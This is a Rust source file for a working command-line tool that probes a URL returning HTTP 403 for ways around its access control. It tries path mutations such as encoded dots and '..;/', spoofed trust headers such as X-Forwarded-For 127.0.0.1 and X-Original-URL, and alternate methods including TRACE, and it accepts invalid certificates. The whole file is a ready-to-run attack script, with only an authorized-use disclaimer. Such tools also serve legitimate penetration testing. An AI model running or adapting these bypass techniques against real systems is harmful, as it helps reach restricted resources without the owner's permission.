// biochimera.rs
// -----------------------------------------------------------------------------
// 403-bypass tester ("server tunnel bifurcation").
//
// Given a target URL that returns HTTP 403, this tool re-requests the same
// resource through alternate "routes": path mutations, header spoofing, and
// different HTTP methods. It reports which variants returned a status code
// that differs from the 403 baseline (especially 200/3xx), so a pentester can
// spot a misconfigured access control.
//
// FOR AUTHORIZED SECURITY TESTING AND CTFs ONLY. Only run this against systems
// you own or have explicit written permission to test.
// -----------------------------------------------------------------------------

use clap::Parser;
use reqwest::blocking::Client;
use reqwest::Method;
use std::time::Duration;

#[derive(Parser, Debug)]
#[command(
    name = "biochimera",
    about = "403-bypass tester: probe alternate paths, headers and methods"
)]
struct Args {
    /// Target URL (e.g. https://host/admin) that returns 403
    url: String,

    /// Per-request timeout in seconds
    #[arg(short, long, default_value_t = 10)]
    timeout: u64,

    /// User-Agent header to send
    #[arg(short, long, default_value = "biochimera/0.1")]
    user_agent: String,

    /// Show every attempt, not just interesting ones
    #[arg(short, long)]
    verbose: bool,
}

/// One probe result.
struct Hit {
    kind: &'static str,
    detail: String,
    status: u16,
    len: u64,
}

fn split_url(url: &str) -> (String, String) {
    // Return (origin, path). Keeps query out of path mutations for simplicity.
    if let Some(scheme_end) = url.find("://") {
        let after = &url[scheme_end + 3..];
        if let Some(slash) = after.find('/') {
            let origin = &url[..scheme_end + 3 + slash];
            let path = &after[slash..];
            return (origin.to_string(), path.to_string());
        }
        return (url.to_string(), "/".to_string());
    }
    (url.to_string(), "/".to_string())
}

/// Path mutations that commonly slip past naive path-based rules.
fn path_mutations(path: &str) -> Vec<String> {
    let p = path.trim_end_matches('/');
    let base = if p.is_empty() { "/" } else { p };
    vec![
        format!("{base}/"),
        format!("{base}//"),
        format!("/.{base}/./"),
        format!("{base}/."),
        format!("{base}%2e"),
        format!("{base}/%2e/"),
        format!("{base}..;/"),
        format!("{base};/"),
        format!("{base}%20"),
        format!("{base}%09"),
        format!("{base}?"),
        format!("{base}#"),
        format!("{base}.json"),
        format!("{base}/~"),
        format!("{base}/*"),
        base.to_uppercase(),
    ]
}

/// Headers that spoof an internal / trusted origin.
fn header_tricks() -> Vec<(&'static str, &'static str)> {
    vec![
        ("X-Forwarded-For", "127.0.0.1"),
        ("X-Forwarded-Host", "127.0.0.1"),
        ("X-Originating-IP", "127.0.0.1"),
        ("X-Remote-IP", "127.0.0.1"),
        ("X-Remote-Addr", "127.0.0.1"),
        ("X-Client-IP", "127.0.0.1"),
        ("X-Host", "127.0.0.1"),
        ("X-Custom-IP-Authorization", "127.0.0.1"),
        ("X-Original-URL", "/"),
        ("X-Rewrite-URL", "/"),
        ("X-Forwarded-Proto", "http"),
        ("Referer", "127.0.0.1"),
        ("X-Forwarded-For", "localhost"),
    ]
}

fn methods() -> Vec<Method> {
    vec![
        Method::GET,
        Method::POST,
        Method::HEAD,
        Method::OPTIONS,
        Method::PUT,
        Method::PATCH,
        Method::DELETE,
        Method::TRACE,
    ]
}

fn body_len(resp: reqwest::blocking::Response) -> u64 {
    resp.bytes().map(|b| b.len() as u64).unwrap_or(0)
}

fn main() {
    let args = Args::parse();
    let client = Client::builder()
        .timeout(Duration::from_secs(args.timeout))
        .danger_accept_invalid_certs(true)
        .redirect(reqwest::redirect::Policy::none())
        .user_agent(args.user_agent.clone())
        .build()
        .expect("failed to build HTTP client");

    let (origin, path) = split_url(&args.url);

    // Baseline.
    let baseline = match client.get(&args.url).send() {
        Ok(r) => {
            let s = r.status().as_u16();
            println!("[*] Baseline {} -> {}", args.url, s);
            s
        }
        Err(e) => {
            eprintln!("[!] Baseline request failed: {e}");
            std::process::exit(1);
        }
    };

    let mut hits: Vec<Hit> = Vec::new();

    // 1) Path mutations.
    for m in path_mutations(&path) {
        let url = format!("{origin}{m}");
        if let Ok(resp) = client.get(&url).send() {
            let status = resp.status().as_u16();
            let len = body_len(resp);
            if args.verbose || status != baseline {
                println!("[path]   {status}  {url}");
            }
            if status != baseline {
                hits.push(Hit { kind: "path", detail: url, status, len });
            }
        }
    }

    // 2) Header tricks (on the original URL).
    for (h, v) in header_tricks() {
        if let Ok(resp) = client.get(&args.url).header(h, v).send() {
            let status = resp.status().as_u16();
            let len = body_len(resp);
            if args.verbose || status != baseline {
                println!("[header] {status}  {h}: {v}");
            }
            if status != baseline {
                hits.push(Hit { kind: "header", detail: format!("{h}: {v}"), status, len });
            }
        }
    }

    // 3) HTTP methods.
    for method in methods() {
        if let Ok(resp) = client.request(method.clone(), &args.url).send() {
            let status = resp.status().as_u16();
            let len = body_len(resp);
            if args.verbose || status != baseline {
                println!("[method] {status}  {method}");
            }
            if status != baseline {
                hits.push(Hit { kind: "method", detail: method.to_string(), status, len });
            }
        }
    }

    println!("\n=== Summary ===");
    println!("Baseline status: {baseline}");
    if hits.is_empty() {
        println!("No variants differed from the baseline.");
    } else {
        println!("{} variant(s) differed from baseline:", hits.len());
        for h in &hits {
            println!("  [{}] {} -> {} ({} bytes)", h.kind, h.detail, h.status, h.len);
        }
    }
}
